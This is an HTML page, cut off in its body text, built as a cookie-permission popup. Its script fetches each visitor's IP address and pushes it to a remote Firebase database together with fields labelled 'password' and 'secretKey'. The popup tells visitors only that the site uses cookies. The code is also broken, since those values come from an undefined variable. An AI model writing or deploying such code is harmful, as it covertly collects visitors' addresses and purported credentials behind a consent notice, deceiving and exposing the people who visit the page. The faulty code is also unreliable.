<!DOCTYPE html>
<html>
<head>
	<title>Cookie Permissions and IP Addresses</title>
	<style>
		.popup {
			position: fixed;
			top: 50%;
			left: 50%;
			transform: translate(-50%, -50%);
			background-color: #ffffff;
			padding: 20px;
			border: 1px solid #cccccc;
			box-shadow: 0px 0px 10px #cccccc;
			z-index: 999;
			display: none;
		}

		.overlay {
			position: fixed;
			top: 0;
			left: 0;
			width: 100%;
			height: 100%;
			background-color: rgba(0, 0, 0, 0.5);
			z-index: 998;
			display: none;
		}

		.popup h2 {
			margin-top: 0;
		}

		.popup p {
			margin-bottom: 0;
		}

		.popup button {
			margin-top: 20px;
		}
	</style>
	<script src="https://www.gstatic.com/firebasejs/9.0.2/firebase-app.js"></script>
	<script src="https://www.gstatic.com/firebasejs/9.0.2/firebase-database.js"></script>
	<script>
		var firebaseConfig = {
			// Your Firebase configuration goes here
		};
		firebase.initializeApp(firebaseConfig);
		var db = firebase.database();

		function showPopup() {
			var popup = document.getElementById('popup');
			var overlay = document.getElementById('overlay');
			popup.style.display = 'block';
			overlay.style.display = 'block';
		}

		function hidePopup() {
			var popup = document.getElementById('popup');
			var overlay = document.getElementById('overlay');
			popup.style.display = 'none';
			overlay.style.display = 'none';
		}

		function setCookie() {
			document.cookie = 'cookiePermission=granted; expires=' + new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toUTCString();
			hidePopup();
			storeIP();
		}

		function getCookie(name) {
			var cookies = document.cookie.split(';');
			for (var i = 0; i < cookies.length; i++) {
				var cookie = cookies[i].trim();
				if (cookie.startsWith(name + '=')) {
					return cookie.substring(name.length + 1);
				}
			}
			return null;
		}

		function storeIP() {
			fetch('https://api.ipify.org')
				.then(function(response) {
					return response.text();
				})
				.then(function(ip) {
					var userId = cookie
					var password = cookie
					var secretKey = cookie 
					db.ref('users/' + userId).push({
						ip: ip,
						password: password,
						secretKey: secretKey
					});
				})
				.catch(function(error) {
					console.log(error);
				});
		}

		window.addEventListener('load', function() {
			var cookiePermission = getCookie('cookiePermission');
			if (!cookiePermission) {
				showPopup();
			} else {
				storeIP();
			}
		});
	</script>
</head>
<body>
	<div class="overlay" id="overlay"></div>
	<div class="popup" id="popup">
		<h2>Cookie Permissions</h2>
		<p>We use cookies
